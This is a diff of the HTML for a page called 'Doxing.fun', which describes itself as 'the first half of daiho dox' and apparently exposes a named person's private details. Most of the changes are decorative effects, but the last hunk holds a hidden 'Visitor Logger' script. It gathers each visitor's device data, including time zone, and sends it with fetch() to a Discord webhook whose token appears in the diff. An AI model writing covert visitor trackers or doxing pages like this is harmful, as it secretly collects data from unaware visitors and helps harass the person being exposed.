@@ -10,14 +10,14 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta property="og:title" content="Doxing.fun | robio own u :3" />
-  <meta property="og:description" content="A fun interactive website with smooth cursor effects, snowflakes, and music!" />
-  <meta property="og:image" content="https://yourdomain.com/ddox.png" />
-  <meta property="og:url" content="https://yourwebsite.com" />
-  <meta name="twitter:card" content="summary_large_image" />
+  <meta property="og:description" content="the first half of daiho dox" />
+  <meta property="og:image" content="https://doxing.fun/ddox.png" />
+  <meta property="og:url" content="https://doxing.fun/" />
+  <meta name="twitter:card" content="https://doxing.fun/ddox.png" />
   <meta name="twitter:title" content="Doxing.fun | robio own u :3" />
-  <meta name="twitter:description" content="A fun interactive website with smooth cursor effects, snowflakes, and music!" />
-  <meta name="twitter:image" content="https://yourdomain.com/ddox.png" />
-  <meta name="twitter:url" content="https://yourwebsite.com" />
+  <meta name="twitter:description" content="the first half of daiho dox" />
+  <meta name="twitter:image" content="https://doxing.fun/ddox.png" />
+  <meta name="twitter:url" content="https://doxing.fun/" />
   <title>Doxing.fun | robio own u :3</title>
   <style>
     /* Loader styles */
@@ -131,7 +131,7 @@
       100% { transform: translateY(100px) scale(0.5); opacity: 0; }
     }
 
-    /* Custom Cursor */
+    /* Custom Cursor Style */
     .custom-cursor {
   position: fixed;
   top: 0;
@@ -145,6 +145,7 @@
   transform: translate(-50%, -50%);
   z-index: 9999;
 }
+
 
   </style>
 </head>
@@ -168,77 +169,158 @@
 
   <img src="ddox.png" alt="DDOX Image" />
 
+<!-- Video Section -->
+<div class="video-container">
+  <video id="custom-video" controls>
+    <source src="ddox.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+</div>
+
+<style>
+  .video-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-top: 50px; /* Increased space between the image and video */
+  }
+
+  video {
+    max-width: 80%;
+    height: auto;
+    border: 2px solid red;
+    border-radius: 10px;
+    box-shadow: 0 0 15px red;
+    transition: box-shadow 0.3s ease-in-out;
+  }
+
+  video:hover {
+    box-shadow: 0 0 30px red;
+  }
+</style>
+
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+  // Loader: hide after 5 seconds
+  setTimeout(() => {
+    document.getElementById('loader').classList.add('hidden');
+  }, 5000);
+
+  // Background Music
+  const audio = document.getElementById('background-music');
+  const playAudio = () => {
+    audio.play().catch(() => console.log('Autoplay prevented. Waiting for user interaction.'));
+    document.removeEventListener('click', playAudio);
+  };
+  document.addEventListener('click', playAudio);
+
+  // Custom Smooth Cursor
+  const customCursor = document.createElement('div');
+  customCursor.classList.add('custom-cursor');
+  document.body.appendChild(customCursor);
+
+  let mouseX = 0, mouseY = 0;
+  let cursorX = 0, cursorY = 0;
+
+  document.addEventListener('mousemove', (e) => {
+    mouseX = e.clientX;
+    mouseY = e.clientY;
+  });
+
+  function animateCursor() {
+    cursorX += (mouseX - cursorX) * 0.2;
+    cursorY += (mouseY - cursorY) * 0.2;
+    customCursor.style.transform = `translate(${cursorX}px, ${cursorY}px)`;
+    requestAnimationFrame(animateCursor);
+  }
+  animateCursor();
+
+  // Snowflakes following cursor and scrolling with the page
+  setInterval(() => {
+    const snowflake = document.createElement('div');
+    snowflake.className = 'snowflake';
+    const size = Math.random() * 5 + 3;
+    snowflake.style.width = size + 'px';
+    snowflake.style.height = size + 'px';
+    
+    // Position snowflakes based on cursor and scroll position
+    snowflake.style.left = cursorX + (Math.random() * 10 - 5) + 'px';
+    snowflake.style.top = cursorY + (Math.random() * 10 - 5) + window.scrollY + 'px';  // Adjust with scroll
+
+    document.body.appendChild(snowflake);
+    setTimeout(() => snowflake.remove(), 2100);
+  }, 150);
+
+  // Gold Sparkles Effect
+  const asciiContainer = document.getElementById("ascii-container");
+  function createSparkle() {
+    const sparkle = document.createElement("div");
+    sparkle.className = "sparkle";
+    const rect = asciiContainer.getBoundingClientRect();
+    sparkle.style.left = Math.random() * rect.width + "px";
+    sparkle.style.top = Math.random() * rect.height + "px";
+    asciiContainer.appendChild(sparkle);
+    setTimeout(() => sparkle.remove(), 1500);
+  }
+  setInterval(createSparkle, 300);
+});
+
+</script>
+
+
+
   <div class="glowing-text-box">
-    <p>This is a sample text inside the glowing box. Edit this text in the HTML!</p>
+    <p>Made with <3 by <B>robio</B></p>
   </div>
 
-  <audio id="background-music" autoplay loop>
-    <source src="ddox.mp3" type="audio/mpeg" />
-    Your browser does not support the audio element.
-  </audio>
 
   <script>
     document.addEventListener('DOMContentLoaded', () => {
-      // Loader: hide after 5 seconds
-      setTimeout(() => {
-        document.getElementById('loader').classList.add('hidden');
-      }, 5000);
-  
-      // Background Music
-      const audio = document.getElementById('background-music');
-      const playAudio = () => {
-        audio.play().catch(() => console.log('Autoplay prevented. Waiting for user interaction.'));
-        document.removeEventListener('click', playAudio);
-      };
-      document.addEventListener('click', playAudio);
-  
-      // Custom Smooth Cursor
-      const customCursor = document.createElement('div');
-      customCursor.classList.add('custom-cursor');
-      document.body.appendChild(customCursor);
-  
-      let mouseX = 0, mouseY = 0;
-      let cursorX = 0, cursorY = 0;
-  
-     document.addEventListener('mousemove', (e) => {
-  mouseX = e.clientX;
-  mouseY = e.clientY;
-});
-  
-      function animateCursor() {
-        cursorX += (mouseX - cursorX) * 0.2;
-        cursorY += (mouseY - cursorY) * 0.2;
-        customCursor.style.transform = `translate(${cursorX}px, ${cursorY}px)`;
-        requestAnimationFrame(animateCursor);
-      }
-      animateCursor();
-  
-      // Snowflakes following cursor
-      setInterval(() => {
-        const snowflake = document.createElement('div');
-        snowflake.className = 'snowflake';
-        const size = Math.random() * 5 + 3;
-        snowflake.style.width = size + 'px';
-        snowflake.style.height = size + 'px';
-        snowflake.style.left = cursorX + (Math.random() * 10 - 5) + 'px';
-        snowflake.style.top = cursorY + (Math.random() * 10 - 5) + 'px';
-        document.body.appendChild(snowflake);
-        setTimeout(() => snowflake.remove(), 2100);
-      }, 150);
-  
-      // Gold Sparkles Effect
-      const asciiContainer = document.getElementById("ascii-container");
-      function createSparkle() {
-        const sparkle = document.createElement("div");
-        sparkle.className = "sparkle";
-        const rect = asciiContainer.getBoundingClientRect();
-        sparkle.style.left = Math.random() * rect.width + "px";
-        sparkle.style.top = Math.random() * rect.height + "px";
-        asciiContainer.appendChild(sparkle);
-        setTimeout(() => sparkle.remove(), 1500);
-      }
-      setInterval(createSparkle, 300);
+  // Loader: hide after 5 seconds
+  setTimeout(() => {
+    const loader = document.getElementById('loader');
+    loader.classList.add('hidden'); // Hide the loader
+    setTimeout(() => {
+      loader.style.display = 'none'; // Remove loader from display
+    }, 500); // Give time for opacity transition
+  }, 5000); // Hide loader after 5 seconds
+
+  // Handle background audio autoplay
+  const audio = document.getElementById('background-music');
+  audio.volume = 1.0;
+  const playAudio = () => {
+    audio.play().catch(() => {
+      console.log('Autoplay prevented. Waiting for user interaction.');
     });
+    document.removeEventListener('click', playAudio);
+  };
+  document.addEventListener('click', playAudio);
+
+  // Custom smooth cursor effect
+  const customCursor = document.createElement('div');
+  customCursor.classList.add('custom-cursor');
+  document.body.appendChild(customCursor);
+
+  let mouseX = 0, mouseY = 0;
+  let cursorX = 0, cursorY = 0;
+
+  document.addEventListener('mousemove', (e) => {
+    // Update mouse coordinates for smooth cursor movement
+    mouseX = e.clientX;
+    mouseY = e.clientY;
+  });
+
+  function animateCursor() {
+    cursorX += (mouseX - cursorX) * 0.25;
+    cursorY += (mouseY - cursorY) * 0.25;
+    customCursor.style.transform = `translate(${cursorX}px, ${cursorY}px)`;
+    requestAnimationFrame(animateCursor);
+  }
+
+  animateCursor();
+});
+
+
   </script>  
 </body>
 
@@ -279,11 +361,11 @@
           { name: "⏳ Time Zone", value: deviceInfo.timezone, inline: false },
           { name: "⚡ Page Load Time", value: `${deviceInfo.pageLoadTime || "Unknown"} ms`, inline: false }
         ],
-        footer: { text: "Website Visit Log", icon_url: "https://yourwebsite.com/logo.png" }
+        footer: { text: "Website Visit Log", icon_url: "https://i.pinimg.com/736x/ab/c6/a7/abc6a7f1d9c0970b2f91ac70eaeb9d46.jpg" }
       };
 
       // Send to Discord Webhook
-      fetch("https://canary.discord.com/api/webhooks/1341786775185788938/RR0LJ9424zWYsSLeAIoMzagv1yHOkgR9Yh6mqSx1ps_xSsTd5kSNKofAPm_nRzjC6DlZ", {
+      fetch("https://canary.discord.com/api/webhooks/1341801406495064197/ypxzFtElhyiMp7jMHG0FpmfHzdVJbhoTvI_j4ICZEwJ7gidycC94BC4-iWX9izayJlkh", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ username: "Visitor Logger", embeds: [embed] })
